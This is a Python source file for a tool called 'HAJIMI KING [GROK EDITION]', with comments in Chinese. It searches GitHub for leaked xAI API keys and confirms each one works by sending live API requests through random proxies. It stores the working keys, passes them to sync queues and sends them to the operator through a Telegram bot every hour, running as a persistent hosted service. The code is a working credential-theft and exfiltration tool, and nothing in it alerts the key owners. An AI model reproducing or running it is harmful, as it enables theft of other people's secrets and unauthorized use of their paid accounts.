import os
import random
import re
import sys
import time
import traceback
import threading
import requests
from datetime import datetime, timedelta
from typing import Dict, List, Union, Any
from http.server import BaseHTTPRequestHandler, HTTPServer

# 已移除 Google 生成式 AI 相关依赖，改用通用 HTTP 请求
# import google.generativeai as genai

from common.Logger import logger

sys.path.append('../')
from common.config import Config
from utils.github_client import GitHubClient
from utils.file_manager import file_manager, Checkpoint, checkpoint
from utils.sync_utils import sync_utils

# --- Telegram 定时发送相关变量 ---
LAST_TG_SEND_TIME = time.time()
PENDING_KEYS_TO_SEND = []

# 创建GitHub工具实例和文件管理器
github_utils = GitHubClient.create_instance(Config.GITHUB_TOKENS)

# 统计信息
skip_stats = {
    "time_filter": 0,
    "sha_duplicate": 0,
    "age_filter": 0,
    "doc_filter": 0
}

# --- 健康检查 Web 服务类 (适配 Koyeb) ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, format, *args):
        return  # 禁用日志记录以保持控制台整洁

def start_health_check_server():
    port = int(os.environ.get("PORT", 8000))
    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
    logger.info(f"👻 Health check server started on port {port}")
    server.serve_forever()

# --- Telegram 汇总发送函数 ---
def send_telegram_summary():
    global LAST_TG_SEND_TIME, PENDING_KEYS_TO_SEND
    
    token = os.getenv("TG_BOT_TOKEN")
    chat_id = os.getenv("TG_CHAT_ID")
    
    if not token or not chat_id or not PENDING_KEYS_TO_SEND:
        PENDING_KEYS_TO_SEND = []
        LAST_TG_SEND_TIME = time.time()
        return

    header = f"📊 【Grok 抓取汇总】\n"
    header += f"⏰ 时间: {datetime.now().strftime('%m-%d %H:%M')}\n"
    header += f"✨ 新发现有效 xAI Key: {len(PENDING_KEYS_TO_SEND)} 个\n\n"
    
    all_keys_text = "\n".join(PENDING_KEYS_TO_SEND)
    full_message = header + all_keys_text
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    
    try:
        MAX_LENGTH = 3500 
        if len(full_message) <= MAX_LENGTH:
            requests.post(url, json={"chat_id": chat_id, "text": full_message}, timeout=15)
        else:
            parts = [full_message[i:i+MAX_LENGTH] for i in range(0, len(full_message), MAX_LENGTH)]
            for index, part in enumerate(parts):
                msg_text = f"📦 部分 {index+1}/{len(parts)}：\n\n" + part
                requests.post(url, json={"chat_id": chat_id, "text": msg_text}, timeout=15)
                time.sleep(1) 
                
        logger.info(f"📤 已向 Telegram 发送汇总报告，共计 {len(PENDING_KEYS_TO_SEND)} 个 Key")
    except Exception as e:
        logger.error(f"❌ Telegram 发送失败: {e}")
    
    PENDING_KEYS_TO_SEND = []
    LAST_TG_SEND_TIME = time.time()


def normalize_query(query: str) -> str:
    query = " ".join(query.split())
    parts = []
    i = 0
    while i < len(query):
        if query[i] == '"':
            end_quote = query.find('"', i + 1)
            if end_quote != -1:
                parts.append(query[i:end_quote + 1])
                i = end_quote + 1
            else:
                parts.append(query[i])
                i += 1
        elif query[i] == ' ':
            i += 1
        else:
            start = i
            while i < len(query) and query[i] != ' ':
                i += 1
            parts.append(query[start:i])

    quoted_strings = []
    language_parts = []
    filename_parts = []
    path_parts = []
    other_parts = []

    for part in parts:
        if part.startswith('"') and part.endswith('"'):
            quoted_strings.append(part)
        elif part.startswith('language:'):
            language_parts.append(part)
        elif part.startswith('filename:'):
            filename_parts.append(part)
        elif part.startswith('path:'):
            path_parts.append(part)
        elif part.strip():
            other_parts.append(part)

    normalized_parts = sorted(quoted_strings) + sorted(other_parts) + sorted(language_parts) + sorted(filename_parts) + sorted(path_parts)
    return " ".join(normalized_parts)


def extract_keys_from_content(content: str) -> List[str]:
    # 修改正则以匹配 xAI 的 Key (前缀通常为 xai-)
    pattern = r'(xai-[a-zA-Z0-9\-_]{30,})'
    return re.findall(pattern, content)


def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint) -> tuple[bool, str]:
    if checkpoint.last_scan_time:
        try:
            last_scan_dt = datetime.fromisoformat(checkpoint.last_scan_time)
            repo_pushed_at = item["repository"].get("pushed_at")
            if repo_pushed_at:
                repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
                if repo_pushed_dt <= last_scan_dt:
                    skip_stats["time_filter"] += 1
                    return True, "time_filter"
        except Exception:
            pass

    if item.get("sha") in checkpoint.scanned_shas:
        skip_stats["sha_duplicate"] += 1
        return True, "sha_duplicate"

    repo_pushed_at = item["repository"].get("pushed_at")
    if repo_pushed_at:
        repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
        if repo_pushed_dt < datetime.utcnow() - timedelta(days=Config.DATE_RANGE_DAYS):
            skip_stats["age_filter"] += 1
            return True, "age_filter"

    lowercase_path = item["path"].lower()
    if any(token in lowercase_path for token in Config.FILE_PATH_BLACKLIST):
        skip_stats["doc_filter"] += 1
        return True, "doc_filter"

    return False, ""


def process_item(item: Dict[str, Any]) -> tuple:
    delay = random.uniform(1, 4)
    file_url = item["html_url"]
    repo_name = item["repository"]["full_name"]
    file_path = item["path"]
    time.sleep(delay)

    content = github_utils.get_file_content(item)
    if not content:
        logger.warning(f"⚠️ Failed to fetch content for file: {file_url}")
        return 0, 0

    keys = extract_keys_from_content(content)
    filtered_keys = []
    for key in keys:
        context_index = content.find(key)
        if context_index != -1:
            snippet = content[context_index:context_index + 45]
            if "..." in snippet or "YOUR_" in snippet.upper():
                continue
        filtered_keys.append(key)
    
    keys = list(set(filtered_keys))
    if not keys:
        return 0, 0

    logger.info(f"🔑 Found {len(keys)} suspected Grok key(s), validating...")

    valid_keys = []
    rate_limited_keys = []

    for key in keys:
        validation_result = validate_grok_key(key)
        if validation_result == "ok":
            valid_keys.append(key)
            logger.info(f"✅ VALID: {key}")
        elif "rate_limited" in validation_result:
            rate_limited_keys.append(key)
            logger.warning(f"⚠️ RATE LIMITED: {key}")
        else:
            logger.info(f"❌ INVALID: {key}, result: {validation_result}")

    if valid_keys:
        file_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys)
        PENDING_KEYS_TO_SEND.extend(valid_keys)
        try:
            sync_utils.add_keys_to_queue(valid_keys)
            logger.info(f"📥 Added {len(valid_keys)} key(s) to sync queues")
        except Exception as e:
            logger.error(f"📥 Sync error: {e}")

    if rate_limited_keys:
        file_manager.save_rate_limited_keys(repo_name, file_path, file_url, rate_limited_keys)

    return len(valid_keys), len(rate_limited_keys)


def validate_grok_key(api_key: str) -> str:
    """验证 Grok (xAI) API Key 的有效性"""
    try:
        time.sleep(random.uniform(0.5, 1.5))
        url = "https://api.x.ai/v1/chat/completions"
        headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        }
        data = {
            "messages": [{"role": "user", "content": "hi"}],
            "model": Config.HAJIMI_CHECK_MODEL,
            "max_tokens": 5
        }
        
        proxies = Config.get_random_proxy()
        response = requests.post(url, json=data, headers=headers, proxies=proxies, timeout=15)

        if response.status_code == 200:
            return "ok"
        elif response.status_code == 401:
            return "unauthorized"
        elif response.status_code == 429:
            return "rate_limited"
        else:
            return f"error_{response.status_code}"
    except Exception as e:
        return f"exception_{type(e).__name__}"


def main():
    threading.Thread(target=start_health_check_server, daemon=True).start()
    
    start_time = datetime.now()
    logger.info("=" * 60)
    logger.info("🚀 HAJIMI KING [GROK EDITION] STARTING")
    logger.info("=" * 60)

    if not Config.check() or not file_manager.check():
        sys.exit(1)

    search_queries = file_manager.get_search_queries()
    total_keys_found = 0
    total_rate_limited_keys = 0
    loop_count = 0

    while True:
        try:
            loop_count += 1
            logger.info(f"🔄 Loop #{loop_count} - {datetime.now().strftime('%H:%M:%S')}")

            # 每一轮循环重置已处理查询，确保持续扫描更新
            checkpoint.processed_queries = set()

            loop_processed_files = 0
            for i, q in enumerate(search_queries, 1):
                normalized_q = normalize_query(q)
                if normalized_q in checkpoint.processed_queries:
                    continue

                res = github_utils.search_for_keys(q)
                if res and "items" in res:
                    items = res["items"]
                    query_valid = 0
                    query_429 = 0

                    for item_index, item in enumerate(items, 1):
                        if item_index % 20 == 0:
                            file_manager.save_checkpoint(checkpoint)
                            file_manager.update_dynamic_filenames()

                        should_skip, _ = should_skip_item(item, checkpoint)
                        if should_skip:
                            continue

                        v, r = process_item(item)
                        query_valid += v
                        query_429 += r
                        checkpoint.add_scanned_sha(item.get("sha"))
                        loop_processed_files += 1

                    total_keys_found += query_valid
                    total_rate_limited_keys += query_429
                    logger.info(f"✅ Query {i}/{len(search_queries)}: Found {query_valid} valid")

                checkpoint.add_processed_query(normalized_q)
                checkpoint.update_scan_time()
                file_manager.save_checkpoint(checkpoint)

            # 检查 Telegram 汇总发送
            if time.time() - LAST_TG_SEND_TIME >= 3600:
                send_telegram_summary()

            logger.info(f"🏁 Loop #{loop_count} done. Sleeping...")
            time.sleep(10)

        except KeyboardInterrupt:
            sync_utils.shutdown()
            break
        except Exception as e:
            logger.error(f"💥 Loop Error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    main()
